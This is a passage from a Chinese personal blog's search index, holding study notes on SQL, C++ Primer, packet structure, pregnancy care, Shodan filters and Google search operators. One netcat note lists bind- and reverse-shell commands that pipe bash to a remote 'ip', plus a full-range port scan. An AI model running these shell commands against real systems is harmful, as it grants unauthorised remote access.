SP.shop_id, SP.shop_name, SP.product_id, P.product_name,  P.sale_price, IP.inventory_quantity\n        from ShopProduct as SP\n               inner join Product AS P\n                  ON SP.product_id = P.product_id\n               inner join InventoryProduct as IP\n                  ON SP.product_id = IP.product_id\n        where IP.inventory_id = 'P001';           //是不是看着头晕，是不是以为这里会有分析，没事，晕啊晕啊也就习惯了\n ```\n\n12. select SP.shop_id, SP.shop_name, SP.product_id, P.product_name from ShopProduct as SP cross join Product as P;   //交叉联结，又称迪卡儿积\n\n###### SQL高级处理 ######\n\n1. OLAP函数，你可以称为窗口函数或者分析函数，可以进行排序、生成序列号等一般的聚合函数无法实现的高级操作。\n2. 窗口函数的公式   <窗口函数> over ([PARTITION BY <列清单>] order by <排序用列清单>)\n3. 可以作为窗口函数的聚合函数\n  + 能够作为窗口函数的聚合函数（sum,avg,count,max,min)\n  + rank, dense_rank, row_number 等专用窗口函数\n  + rank函数在计算排序时，如果存在相同位次的记录，则会跳过之后的位次，例如：1,1,1,4\n  + dense_rank函数在计算排序时，在遇到相同位次的记录也不会跳过之后的位次，例如：1,1,1,2,3\n  + row_number函数赋予唯一的位次，例如：1,2,3,4\n4. select product_name, product_type, sale_price, RANK () OVER (PARTITION BY product_type  order by sale_price)  as ranking from Product;  // 根据不同的商品品类，按照销售单价从低到高的顺序创建排序表\n5. select product_name, product_type, sale_price, RANK () OVER (ORDER BY sale_price) as ranking from Product;     //不按照商品品类，直接进行排序\n6. 通过PARTITION BY 分组之后的记录集合称为窗口，此处的窗口并非“窗户”的含义， 而是代表范围， 这也是窗口函数名称的由来。    \n7. 专用窗口函数无需任何参数，因此括号内通常是空的\n8. 原则上窗口函数只能在select子句中使用。\n9. select product_id, product_name, sale_price, sum(sale_price) over (order by product_id) as current_sum from Product; //使用聚合函数作为窗口函数\n10. ```指定包含本行在内的上面三行作为汇总对象\nselect product_id, product_name, sale_price, avg(sale_price)\n        over (order by product_id rows 2 preceding) as moving_avg\nfrom Product;            //preceding 之前，   following  之后，示例自己写\n```\n\n11. ```指定包含本行在内的上下总计三行作为汇总对象\nselect product_id, product_name, sale_price, avg(sale_price)\n      over (order by product_id\n                  rows between 1 preceding and 1 following)\n                  as moving_avg\nfrom Product;\n```\n\n12. select product_type, sum(sale_price) as sum_price   from Product group by rollup(product_type);   //使用rollup同时得出合计和小计\n13. ```使用grouping函数判断NULL\nselect  grouping(product_type)  as product_type,\n        grouping(regist_date) as regist_date, sum(sale_price) as sum_price\nfrom Product\n group by rollup(product_type, regist_date);\n```\n\n14. ```在超级分组记录的键值中插入恰当的字符串\nselect case when grouping(product_type) = 1\n            then '商品种类 合计'\n            else product_type end as product_type,\n       case when grouping(regist_date) = 1\n            then '登记日期 合计'\n            else cast(regist_date as VARCHAR(16)) end as regist_date,\n      sum(sale_price) as sum_price\nfrom Product\ngroup by rollup(product_type, regist_date);         //看着头晕系列\n```\n\n15. ```使用cube取得全部组合的结果\nselect case when grouping(product_type) = 1\n            then '商品种类  合计'\n            else product_type end as product_type,\n       case when grouping(regist_date) = 1\n            then '登记日期 合计'\n            else cast(regist_date as VARCHAR(16)) end as regist_date,\n       sum(sale_price) as sum_price\nfrom Product\ngroup by cube(product_type, regist_date);\n```\n\n\n16. ```使用grouping sets 取得部分组合的结果\nselect case when grouping(product_type) = 1\n            then '商品种类  合计'\n            else product_type end as product_type,\n       case when grouping(regist_date) = 1\n            then '登记日期 合计'\n            else cast(regist_date as VARCHAR(16)) end as regist_date,\n       sum(sale_price) as sum_price\nfrom Product\ngroup by grouping sets (product_type, regist_date);\n```\n\n以上，sql入门已经完成（啊呸，心里有点b数好不好）所有源码都在啥鸟里面测试通过（大概）。进阶那本明年再说（如果不会压箱底的话），大家能看懂就加油看，看不懂就问度娘，或者问情书大佬（逃\n","tags":["笔记"],"categories":["Linux"]},{"title":"孕妇的照料笔记","url":"%2F2019%2F01%2F23%2F%E5%AD%95%E5%A6%87%E7%9A%84%E7%85%A7%E6%96%99%E7%AC%94%E8%AE%B0%2F","content":"\n1. 孕周期是从上次月经结束开始算为第一周。\n2. 多准备水果和可以立刻吃的东西，因为你永远都不知道她什么时候会饿。\n3. 吃得东西种类要多，因为今天想吃的东西明天说不定就不想吃了。\n4. 准备的数量要多，因为每天要吃的量会很可观。\n5. 孕吐和饥饿感是可以并存的。\n6. 饥饿很容易导致心情不好。\n","tags":["笔记_bak"],"categories":["碎碎念_bak"]},{"title":"netcat","url":"%2F2019%2F01%2F06%2Fnetcat%2F","content":"\n\nNC缺乏加密和身份验证的能力\n\n\n网络工具中的瑞士军刀。\n有侦听模式和传输模式\n传输文本信息，传输文件\n可以远程控制\n可以端口扫描\n\n\n ```   nc -lp port     ```      监听\n ```   nc -nv ip  port    -q  1      ```\n\n\n  ```      nc -nvz   ip   1-65535   ```      端口扫描\n\n\n远控       \n正向  ``` nc -lp port -c bash  ```                  windows换为cmd\n    ```       nc  ip port       ```\n\n反向 ```   nc lp port       ```\n  ``` nc ip port -c bash ```\n\nOptions:\n+ -c shell commands  \n+ -e, --exec=PROGRAM program to exec after connect\n+ -g, --gateway=LIST source-routing hop point[s], up to 8\n+ -G, --pointer=NUM source-routing pointer: 4, 8, 12, ...\n+ -h, --help display this help and exit\n+ -i, --interval=SECS delay interval for lines sent, ports scanned\n+ -l, --listen listen mode, for inbound connects\n+ -L, --tunnel=ADDRESS:PORT forward local port to remote address\n+ -n, --dont-resolve numeric-only IP addresses, no DNS\n+ -o, --output=FILE output hexdump traffic to FILE (implies -x)\n+ -p, --local-port=NUM local port number\n+ -r, --randomize randomize local and remote ports\n+ -s, --source=ADDRESS local source address (ip or hostname)\n+ -t, --tcp TCP mode (default)\n+ -T, --telnet answer using TELNET negotiation\n+ -u, --udp UDP mode\n+ -v, --verbose verbose (use twice to be more verbose)\n+ -V, --version output version information and exit\n+ -x, --hexdump hexdump incoming and outgoing traffic\n+ -w, --wait=SECS timeout for connects and final net reads\n+ -z, --zero zero-I/O mode (used for scanning)\n\n\n\n\n\n\nncat 包含于nmap工具包中\n\nncat -c bash --allow ip -vnl port --ssl\nncat -nv ip port --ssl\n","tags":["漏洞利用"],"categories":["网络安全"]},{"title":"协议包类型和结构","url":"%2F2019%2F01%2F06%2F%E5%8D%8F%E8%AE%AE%E5%8C%85%E7%B1%BB%E5%9E%8B%E5%92%8C%E7%BB%93%E6%9E%84%2F","content":"\n\n例:arp\n 第一层包的相关信息。多少帧，大小，传输时间等统计信息\n 第二层数据包的内容字段。首先是目标地址，源地址。上层协议类型。  占位地段\n 第三arp包头。 硬件地址类型1表示以太网    协议类型ip解析成arp地址  硬件地址长度   ip地址4字节32位   操作代码  arp包头内容包含发送端的mac和ip目标端的mac和ip\n例：ssdp\n 第一层汇总信息\n 第二层二层包头 目标地址，源地址   上一层协议是ip协议  \n 第三层。ip版本号  头长度  dsf  total长度（ip头到数据字段）   identification:0*7b52(31570)=大文件传输时会分割成小块，这是标记号段接收端\n 根据号顺序重组    ragment offset:0 =偏移量    time to live:1 =生存时间  protocol:UDP (17)=上层四层协议（共1-255种协议)\n header chechsum:0*8cf3[correct]=ip头的校验值，数据包被修改后校验值为错误的\n 第四层 user Datagram protocol,src port:56253(56253),Dst port:ssdp(1900)  =源端口目标端口\ntcp包三次会话以syn标号1为开始连接。目标返回ack值并发syn值。 我再次发送ack值确认。然后开始发送信息,每发送包都要确认\ndns三层都走ip四层是基于udp协议\nhttp三层ip四层tcp  repuest method:get=请求方法get  request url:http://dict.cn/ws.php=请求地址    request version:http:/1.1=请求版本1.1\n  user-agent:mozilla/4.0(compatible:msie 5.00;windows 98)\\r\\n=客户端信息\n","tags":["原理"],"categories":["网络安全"]},{"title":"shodan","url":"%2F2019%2F01%2F06%2Fshodan%2F","content":"\n域名为 www.shodan.io\n\n常见filter\n\nnet    city     country    port    os      hostname(主机或者域名)    server\n\n\n例如：\n+ country:CN   city:beijing port 81 HTTP/1.1   200\n+ OS: win32\n+ OS: Win  Database-MySQL\n+ OS: CentOS\n+ OS: Red Hat Port: 22 \n","tags":["工具"],"categories":["网络安全"]},{"title":"google搜索语法","url":"%2F2019%2F01%2F03%2Fgoogle%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95%2F","content":"\n###### 表格 ######\n\n\n| 关键字        |  描述       | 效果  | 使用场景 |\n| ------------- |:-------------:|:-------------:| -----:|\n| intitle:    | 在页面的标题中查找字符串|  与其他运算符混合使用效果很好 | 最好在网页，网上论坛，图片和新闻搜索中使用  |\n| allintitle:\t | 在一个页面的标题里查找所有搜索项  |其他运算符或搜索项混合使用效果差 | 最好在网页，网上论坛，图片和新闻搜索中使用 |\n| inurl: \t|   在一个页面的url里查找字符串  |  与其他运算符混合使用效果好 | 最好在网页和图片搜索中使用 |\n| allinurl\t | \t 在一个页面的url里查找所有的搜索项 | 其他运算符或搜索项混合使用效果差 | 最好在网页，网上论坛和图片搜索中使用 |\n| filetype:\t|   基于文件扩展名搜索特殊类型文件 ,与ext同义  | 需要一个额外的搜索项;其他运算符或搜索项混合使用效果差 | 最好在网页和网上论坛搜素中使用 |\n| allintext:\t|\t在一个页面的文本里查找所有搜索项  | 纯粹一个小恶魔，就别用它 |忘掉所有关于allintext的传说 |\n| site: |  把一个搜索限定在一个特别的网站或域中 |  能够单独使用; 与其他运算符混合使用效果好 |  最好在网页，网上论坛和图片搜索中使用 |\n| link:\t| \t搜索一个网站的链接或者url | 无法与其他运算符或者搜索项混合使用 | 最好在网页搜索中使用 |\n| inanchor:\t|\t\t在链接的描述性文字中查找文本  | 其他运算符或搜索项混合使用效果好 | 最好在网页，图片和新闻搜索中使用 |\n| daterange: |\t寻找在一个特定日期范围内索引过的页面 | 需要一个搜索项;与其他运算符或搜索项混合使用效果好 | 最好在网页搜索中使用;可能会让位于as_qdr而被淘汰 |\n| numrange: |\t在特定范围内查找一个数字 |与其他运算符或者搜索项混合使用效果佳 | 最好在网页搜索中使用 ;与ext同义 |\n| cache:  | 显示google缓存的页面拷贝  | 无法与其他运算符或搜索项混合使用 | 最好在网页搜索中使用 |\n| info: | \t显示关于一个页面的总结信息 | 无法与其他运算符或搜索项混合使用 | 最好在网页搜索中使用 |\n| related: |\t显示与所给网站或url相关的站点 | 无法与其他运算符或搜索项混合使用 | 最好在网页搜索中使用 |\n|stocks: |\t为一个股票代码显示Yahoo财经的股票列表 | 无法与其他运算符或者搜索项混合使用  | 最好在网页搜索中使用 |\n| defind: |\t\t显示单词或短语的各种不同的语义  | 无法与其他运算符或搜索项混合使用 | 最好在网页搜索中使用 |\n\n###### 基本法则 ######\n\n1. google 无视大小写 。[注：当or被当作布尔逻辑运算符的时候必须大写]\n2. google 的通配符×（星花）在一个搜索短语中只会表示一个单词，在单词的开始和结尾处使用×比起使用单词本身来讲并没有什么区别。\n3. goole保留忽略的权利：在google搜索中存在停用词，即为会忽略的某些停用单词，可参考基础搜索文档[www.google.com/help/basics.html]\n4. google限制32个字符的查询，但是32个字符内不包括通配符，即可以使用通配符延长查询字符串的长度。\n","tags":["工具"],"categories":["网络安全"]},{"title":"C++primer笔记————第八章","url":"%2F2019%2F01%2F02%2FC-primer%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E7%AC%AC%E5%85%AB%E7%AB%A0%2F","content":"\n##### 重载函数 #####\n1. 函数重载允许多个函数共享同一个函数名，但是针对不同参数类型提供共同的操作。\n2. 如果两个相同函数名的函数的参数表相同，但是返回类型不同，则第二个声明被视为第一个的错误重复声明，会被标记为编译错误。\n3. 当一个参数类型为const或者volatile时，在识别函数声明是否相同时，并不会考虑const或volatile修饰符。\n4. 如果把const或者volatile应用在指针上或者引用参数指向的类型上，则在判断函数声明是否相同时，就需要考虑const和volatile修饰符号。\n5. 重载函数集合中的全部函数都应该在同一个域中声明。否则会出现被隐藏的可能性。\n6. 不同命名空间中的函数不能互相重载。\n7. 用户不能在using声明中为一个函数指定参数表。\n8. 由using声明所引入的函数重载了在该声明所出现的域中同名函数的其他声明。\n9. 同一重载函数集合中的函数都是同一个域中被声明的，即使这些声明可能时用using声明或者using指示符引入的。\n10. 链接指示符只能指定重载函数集中的一个函数。\n11. 链接指示符并不影响函数调用时对函数的选择，只用参数类型来选择将被调用的函数，被选中的函数是与实参类型精确匹配的那个。\n12. 在编译的时候，每个函数名以及其相关参数表都被作为一个唯一的内部内部名编码。\n13. 在C语言中没有重载函数的概念。\n14. 函数重载解析是把函数调用与重载函数集合中的一个函数相关联的过程。\n15. 函数重载解析的步骤：\n    1. 确定函数调用考虑的重载函数集合，确定函数调用中实参表的属性。\n    2. 从重载函数集合中选择函数，该函数可以在（给出实参个数和类型）的情况下用调用中指定的实参进行调用。\n    3. 选择与调用最匹配的函数。\n16. 最佳可行函数挑选规则\n    1. 应用在实参上的转换不比调用其他可行函数所需转换差。\n    2. 在某些实参上的转换要比其他可行函数对该实参的转换好。\n","tags":["C++primer"],"categories":["C++"]},{"title":"C++primer笔记————第七章","url":"%2F2019%2F01%2F02%2FC-primer%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E7%AC%AC%E4%B8%83%E7%AB%A0%2F","content":"\n##### 域和生命期 #####\n1. C++程序中每一个名字都必须指向唯一的一个实体（对象、函数、类型或者模板）。\n2. 一个名字被重新使用以指向不同的实体，只要编译器能够根据上下文来区分出该名字的不同含义即可。\n3. 用来区分名字含义的一般上下文就是域。C++中含有三种域，局部域、名字空间域和类域。\n4. 局部域是定义在函数定义中的程序文本部分。每一个函数都有一个独立的局部域，在函数中每个复合语句也有一个独立的局部域。\n5. 名字空间域是不包含在函数声明、函数定义或者类定义的程序文本部分。\n6. 程序的最外层的名字空间域被称为全局域或者全局名字空间域。\n7. 同一个名字在不同的域中可以引用不同的实体。\n8. 由声明引入的名字从声明点直到声明它的类结束为止都是可见的（包含其中的嵌套域）\n9. 名字解析（name resolution）是把表达式中的一个名字和某一个声明相关联的过程。也是给出这个名字的意义的过程。这个过程依赖于该名字是如何被使用的。以及使用该名字的域。\n10. 局部域内的名字解析的过程：首先查找使用该名字的域，如果找到一个声明，则该名字被解析，如果没有找到，则查找包含该域的域，知道找到一个声明或者查找完整个全局域。\n11. 因为在名字解析期间查找域的顺序是由内向外的，因此在外围域中的声明被嵌套域中的同名声明所隐藏。\n12. 在if语句中定义的变量，之在该if语句和相关的else语句以及内部的嵌套域中可见。\n13. 全局域内的函数声明将引入全局函数。全局域内的变量声明将引入全局对象。全局对象是一个运行时刻实体，他的程序的整个执行周期内都存在。它所占据的存储区的生命期（lifetime）从程序启动开始，在程序终止时结束。\n14. 全局对象和非inline全局函数必须有一个定义并且只能被定义一次。或者多次完全相同的定义。这被称为一次定义法则（ODR，one definition rule）\n15. 函数声明指定了该函数的名字以及函数的返回类型和参数表。\n16. 函数定义除了函数声明所包含的信息外，还为函数提供了函数体。并且分配了内存。\n17. 在全局域中定义的对象，如果没有指定显示的初始值，则该存储区被初始化为0。（仅在debug版本下）\n18. 关键字extern 为声明但是不定义一个对象提供了一种方法。实际上，它类似于一种函数声明。表示该对象会在其他i地方被定义    \n19. 类型安全连接机制：该机制可以将函数参数的类型和数目编码在函数名中。\n20. 类型安全链接机制为文件之间的函数调用提供了类型检查手段。它对支持重载函数也是必须的。\n21. 不同文件中出现的同一个对象或函数声明的其他类型不匹配的情况，在编译和链接时可能不会被捕捉到，因为编译器一次只能处理一个文件，它不能很容易的检查到文件之间的类型违例。这些类型违例可能是程序严重错误的根源。\n22. 文件之间错误的对象声明或者函数返回值类型不能被检测出来，这样的错误只有在运行时刻异常或程序的错误输出中才能被揭示出来。\n23. 头文件为所有的extern对象声明、函数声明和inline函数定义提供了一个集中的位置。这被称为声明的局部化。\n24. 头文件中不应该含有非inline函数或对象的定义。这些定义如果在同一个程序的两个或者多个文件中被包含， 便会产生重复定义错误。\n25. 符号常量和inline函数可以被多次定义。\n26. 常量折叠：在程序编译期间，在可能的情况下，符号常量的值会代替该名字出现。\n27. 局部对象的分类：自动对象（automatic object）、寄存器对象(register object)、局部静态对象(local static object)\n28. 自动对象所在存储区从声明它的函数调用开始，一直到该函数结束为止。\n29. 寄存器对象是一种自动对象，它支持对其值的快速读取。\n30. 局部静态对象的存储区在该程序的整个执行期间一直存在。\n31. 分配给自动变量的存储区来自于程序的运行栈。\n32. 自动对象也被成为具有自动存储持续时间或自动范围。\n33. 未初始化的自动对象包含一个随机的位模式，是该存储区上次被使用的结果。它的值被称为未指定的。\n34. 当一个自动变量的地址被存储在一个生命期长于它的指针时，该指针被称为空悬指针（dangling pointer）\n35. register声明：如果可能的话，register对象会被编译器装载到寄存器中。但是register对于编译器来说只是建议\n36. 静态局部对象具有静态存储持续期间（static storage duration） 或静态范围（static extent）虽然它的值在整个程序运行期间是有效的，但是其名字的可视性仍限制在其局部域内。\n37. static对象只会被初始化一次。\n38. new表达式不会返回世纪分配的对象，而是返回指向该对象的指针。\n39. 动态分配数组的好处是第一维不需要为常量值。\n40. 删除动态分配数组的内存：delete[] ss ，如果忘记方括号编译器无法检查到。\n41. 用户声明的名字空间域可以包含其他嵌套的名字空间定义。\n42. 命名空间的的定义可以是非连续的，并且是可以跨文本文件的。\n43. 外围命名空间声明的实体被嵌套的名字空间中声明的同名实体所隐藏。\n44. 名字空间中的实体被局部域中声明的实体所隐藏。\n45. 只有包围该成员声明的名字空间才可能包含它的定义。\n46. 只有当一个名字空间成员在名字空间定义中已经被声明过，它才能在该名字空间定义之外被定义。\n47. 作为名字空间成员的函数和对象的声明被放在头文件中，该文件将被包含在要使用该名字空间的文件中。\n48. 必须使用extern关键字来指明只是声明名字空间成员而不是定义它们。\n49. 一个命名空间可以有很多别名或者同义词。\n50. using指示符是域内的。\n51. using指示符引起的二义性错误是在该名字被使用时才被检测到，而不是遇到using指示符时。\n","tags":["C++primer"],"categories":["C++"]},{"title":"C++primer笔记————第六章","url":"%2F2019%2F01%2F02%2FC-primer%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E7%AC%AC%E5%85%AD%E7%AB%A0%2F","content":"\n##### 函数 #####\n\n1. 函数的定义也可以被称为声明的一种。\n2. 数组类型不能作为函数的返回值返回，但是类类型和容器类型可以被作为返回值返回\n3. C++是一种强类型语言，每个函数调用的实参在编译期间都要经过类型检查。\n4. 编译器必须根据函数参数表，对函数调用的实参执行类型检查，这就是函数必须先声明再使用的原因\n5. 所有的函数都是使用在程序运行栈中分配的存储区。该存储区与该函数相关联，知道函数结束为止，存储区将会\n由系统自动释放以便重新使用，该函数的整个存储区被称为活动记录（activation record）\n6. 参数的存储长度由它的类型来决定。\n7. 参数传递是指用函数调用的实参值来初始化函数参数存储区的过程。\n8. C++参数传递的默认初始化方法为吧实参的值拷贝到参数的存储区中，这个过程又被称为按值传递（传值）\n9. 按值传递时，函数不会访问当前调用的实参，函数处理的值是它本地的拷贝，这些拷贝都被存储在运行栈中，因此改变这些值不会影响到实参的值。\n10. 大型的类对象在作为参数传递时，分配对象并拷贝到栈中的时间和空间开销往往过大。解决方法是传指针或者传引用\n11. 把参数声明成为引用，实际上改变了默认的按值传递参数的传递机制。当参数是引用时，函数接收的是实参的左值而不是值的拷贝，这意味着函数知道实参在内存中的位置，因此能够改变它的值或者取它的地址。\n12. 使用引用作为参数的三个场景：\n    1. 必须将一个参数改变成指针来允许改变实参的值的时候\n    2. 向主调函数返回额外的结果\n    3. 向函数传递大型类对象\n13. 如果想要在使用引用的时候不改变所引用的对象，可以使用把参数声明为const引用\n14. 函数在确定指针实际指向一个有效的对象之前不能安全的解引用一个指针。\n15. 如果一个参数可能在函数中指向不同的对象，或者这个参数可能不指向任何对象，那么必须使用指针参数。\n16. 参数为const时，并不要求实参也一定为const\n17. 在C++中，数组永远不会按值传递，它是传递第0个元素的指针。如果不希望改变数组元素时，可以将参数类型声明为const\n18. 数组长度不是参数类型的一部分\n19. 如果想要让编译器检查数组参数的长度，可以将参数声明为数组的引用。\n20. 容器类型实际上是类类型。\n21. 函数调用的实参按位置解析，缺省实参只能有来替换函数调用缺少的尾部实参。\n22. 一个参数只能在一个文件中被制定一次缺省实参。\n23. 习惯上，缺省实参在公共头文件包含的函数声明中制定，而不是在函数定义中。如果缺省实参在函数定义的参数表中提供，则缺省实参只能用在包含该函数定义的文本文件的函数调用中。\n24. 缺省实参不一定必须是常量表达式，可以使用任意表达式\n25. 当我们无法列出传递参数的所有实参的类型和数目的时候，可以使用省略号指定函数参数表。省略号挂起类型检查机制，它们提示编译器会有0个或多个实参。\n26. 大多数带有省略号的函数都利用显式声明的参数中的一些信息，来获取函数调用中提供的其他可选实参的类型和数目。\n27. 默认情况下，返回值是按值传递的。\n28. 在某些情况下，编译器会将按值传递的返回值转换为按引用传递，该优化被称为命名返回优值优化（named return value optimization）\n29. 为了防止对返回值的无意修改，返回值应该被声明为const\n30. 为一个小操作定义一个函数的好处：\n    1. 方便阅读这样的代码，尤其是这个小操作很复杂的时候\n    2. 方便修改\n    3. 语义是统一的，每个测试都保证以相同的方式实现\n    4. 函数可以被重用\n31. 为小操作定义一个函数的缺点：\n    + 调用函数比直接计算慢的多，因为要拷贝实參，保存机器的寄存器，程序还必须转向一个新位置。\n32. 如果一个函数被指定为内联函数，那么它在程序的每个调用点上都会被展开\n33. 编译器可以忽略inline指令\n34. 程序员用链接指示符extern告诉编译器程序是用其他语言编写的。\n35. extern \"C\" 表示用C语言编写的。\n36. extern \"C\"后面跟的花括号中的函数名对外是可见的。\n37. 若链接指示符后的花括号中含有#include，在头文件中的函数声明都被假定是用链接指示符的程序设计语言所写的。\n38. 链接指示符不能出现在函数体中\n39. 一般来讲，链接指示符放在头文件中更为合适。\n40. 命令行选项是main()函数的实參，在main()函数里，我们可以通过一个名为argv的C风格字符串数组访问它。\n41. int main(int argc, char* argv)   argc 包含了命令行选项的个数，argv包含了argc个C风格字符串\n42. 省略号是函数类型的一部分\n43. 当一个函数名没有被调用操作符修饰时，会被解释成指向该类型函数的指针\n44. 将取地址操作符作用在函数名上也可以产生指向该函数类型的作用。\n45. 只有当赋值操作符左边指针的参数表和返回类型与右边函数或指针的参数表和返回类型完全匹配时，初始化或赋值才是正确的。\n46. 指向函数类型的指针之间不存在隐式类型转换\n47. 函数指针可以用0初始化或者赋值，表示该指针不指向任何函数。\n48. 函数指针在调用函数时，不需要解引用操作符\n49. 当链接指示符应用在一个声明上时，所有被它声明的函数都将受到链接指示符的影响\n","tags":["C++primer"],"categories":["C++"]},{"title":"C++primer笔记————第五章","url":"%2F2019%2F01%2F02%2FC-primer%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%94%E7%AB%A0%2F","content":"\n##### 抽象容器类型 #####\n1. 顺序容器拥有由单一类型元素组成的有序集合。主要用到的有list、vector和deque（双端队列）\n2. 关联容器支持查询一个元素是否存在，并且可以有效地获取元素，两个基本的关联容器类型是map（映射）和set（集合），map和set都只包含每个键的唯一出现，即每个键只允许出现一次。multimap和multiset支持同一个键的多次出现。\n3. 在现实世界中，用户的便利性总是要优先于实现上的便利性。\n4. list、vector和deque都是动态增长的，摘这三者中选择的准则主要是关注插入特性以及对元素的后续访问要求等。\n5. vector的随机访问效率很高，但是在任意位置（非末尾）插入或者删除效率很低。\n6. list任意位置插入和删除效率很高，但是随机访问的效率并不高，并且每个元素还有两个指针的而额外空闲开销。\n7. 选择顺序容器的一些准则。\n   1. 如果我们需要随机访问一个容器。那么vector要比list好的多。\n   2. 如果我们已知要存储元素的数目，那么vector也是要比list好的多。\n   3. 如果我们需要的不只是在容器两端插入和删除元素，那么list显然要比vector好。\n   4. 除非我们需要在容器首部插入和删除元素，否则vector要比deque好。\n8. 如果vector的元素是类对象，那么拷贝和释放内存可能需要对每个元素依次调用拷贝构造和析构函数。\n9. 实际上，由于vector每次增加自身内存时将增加比所需要的更多的内存，因此对于小的对象来说，vector比list效率更高。\n10. 数据类型的长度并不是影响容器性能的唯一标准，数据类型的复杂性也会影响到元素插入的性能。\n11. 对于大型复杂类来说，如果想要增加vector的性能，那么通过存储指向复杂类对象的指针是一个经常使用的方案。原因是容量增加并且指向类对象的指针的拷贝和释放不需要调用类的拷贝构造函数和析构函数。\n12. 容器中的每个元素都被初始化为“与该类型相关联的默认值”。\n13. 容器的比较是指两个容器的元素之间成对进行比较。\n14. 我们定义的容器有三个限制\n    1. 元素类型必须支持等于操作符。\n    2. 元素类型必须支持小于操作符。\n    3. 元素类型必须支持默认值（对于类类型，即指默认构造函数）。\n15. 迭代器提供了一种一般化的方法，对顺序或关联容器类型中的每个元素进行连续访问。\n16. 容器类型所提供的end（）方法返回一个iterator，它指向容器末尾元素的下一个位置。\n17. iterator算术运算只适用于vector或者deque，但是不适用于list，因为list的元素在内存中不是连续存储的。\n18. 容器对象也可以用“由一对iterator标记的起始元素和末尾元素后一个位置之间的拷贝”来初始化。\n19. 栈类型被称为容器适配器，因为它把栈抽象施加在底层容器集上。在默认情况下，栈用deque实现。\n","tags":["C++primer"],"categories":["C++"]},{"title":"C++primer笔记————第四章","url":"%2F2019%2F01%2F02%2FC-primer%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E7%AC%AC%E5%9B%9B%E7%AB%A0%2F","content":"\n##### 语句 #####\n\n1. 声明语句展示了声明的局部性，即声明语句出现在被定义对象首次被使用的局部域内。\n2. else语句与“最后出现的未被匹配的if语句”相匹配。\n3. 关键字case后面的值必须是一种整数类型的常量表达式。\n4. 任意两个case标签不能有同样的值。\n5. 程序从匹配的case语句开始执行并越过case边界一直到switch语句结束。\n6. 把一条声明语句放入与case或者default相关联的语句中是非法的，除非它被放在一个语句块中。\n7. while的判断语句如果第一次便是false，则循环体一次都不会执行。\n8. do while的循环条件不支持对象定义。\n9. break语句终止最近的while 、do while 、for或switch语句。但是只能跳出一层循环。\n10. continue语句终止一次循环。\n11. goto语句可以跳转到同一函数内部的某个地方，但是此语句的用法被认为应该是被丢弃的。\n","tags":["C++primer"],"categories":["C++"]},{"title":"C++primer笔记————第三章","url":"%2F2019%2F01%2F02%2FC-primer%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E7%AC%AC%E4%B8%89%E7%AB%A0%2F","content":"\n##### 表达式 #####\n\n1. 两个整数相除的结果总是整数，如果结果有小数部分，便会被截掉。\n2. %操作符用于求余，若两个操作数都为正数，则余数为正数，若有一个为负数或者两个都为负数，则结果符号取决与机器，因此移植性无法保证。\n3. static_cast<int> something  显式类型转换或者强制类型转换。\n4. 逻辑与操作符两边的操作数被保证按照从左到右的顺序进行计算。因此，如果左边表达式如果为false，那么不会进行右边表达式的计算。\n5. 二元关系操作符（<=和>=）的计算顺序在标准C和C++中都是为定义的，因此计算过程必须与顺序无关。\n6. 赋值不等于初始化，一个对象只能初始化一次，但是可以被赋值多次。\n7. 赋值操作符的左操作数必须为左值————即，它必须有一个相关的、可写的地址值。\n8. 赋值的结果是实际上被放在左操作数相关内存中的值。\n9. 复合赋值操作符：``` +=  -=  ×=   /=  %=   <<=    >>=     &=     ^=      |= ```\n10. C++ 为先将C使用，在++，++C为先++，再使用。\n11. 可以用算数类型的数据给复数类型初始化或者赋值，但是不可以直接用复数类型给算数类型进行初始化或者赋值。\n12. 条件操作符的语法格式：   expr1 ？ expr2 ： expr3   ，如果expr1的结果为true，执行expr2 。如果为false，执行expr3\n13. sizeof操作符的作用是返回一个对象或者类型名的字节长度\n14. sizeof操作符是在编译时刻进行计算，因此被看作是常量表达式。\n15. 系统为每个程序提供了一个在程序执行时可用的内存池。这个可用的内存池被成为程序的空闲存储区或堆。\n运行时刻的内存分配被称为动态内存分配。\n16. 在类对象数组的情况下，如果我们定义了默认构造函数，那么它将被顺次应用在数组的每一个元素上。\n17. 所有从空闲存储区分配的对象都是未命名的，new表达式并不会返回实际被分配的对象，而是返回这个对象的地址，该对象的所有操作都是通过这个地址间接来完成的。\n18. 逗号表达式是一系列由逗号分开的表达式，这些表达式从左到右进行计算。逗号表达式的结果是最右边表达式的值。\n19. 位操作符把操作数解释为有序的位集合，这些位可能是独立的，也可能组成域。\n20. 位操作符允许程序员设置或者测试独立的位或位域\n21. 如果一个对象被用作一组位或位域的离散集合，那么这样的对象被称为位向量。\n22. 左移操作符从右边开始用0补位，右移操作符如果移动无符号数，则右边用0补位，如果是有符号数，则补符号位的拷贝或者是0，这取决于具体实现定义。\n23. 声明bitset对象在默认情况下所有位都被初始化为0。\n24. 算术转换的两个原则：\n    1. 为了防止精度缺失，如果有必要的话，类型总是被提升为较宽的类型。\n    2. 所有含有小于整型的整值类型的算术表达式，在计算之前，其类型都会被转换成整型。\n25. （void*）型指针又被称为泛型指针，但是这类指针无法直接被解除引用，因为没有类型信息用来指导编译器解释底层的位模式。\n26. 执行显式转换的原因：\n    1. 不存在void*指针向特殊指针之间的自动转换。\n    2. 希望改变通常的标准转换\n    3. 避免出现多种转换可能的歧义情况\n","tags":["C++primer"],"categories":["C++"]},{"title":"C++primer笔记————第二章","url":"%2F2019%2F01%2F02%2FC-primer%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E7%AB%A0%2F","content":"\n##### C++数据类型 #####\n1. 文字常量是不可寻址的，也就是说它会存在内存的某个地方，但是我们没有办法获取到它的地址。\n2. 在整型文字常量前面加一个0，该值将被解释为一个八进制数，而在前面加上一个0x则会被解释成为一个十六进制数。\n3. 在默认情况下，文字常量被当作为一个int型的有符号值，可以在后面加一个“L”将其指定为long型。\n4. 可以在文字常量后面加一个“U”将其指定为一个无符号数。\n5. 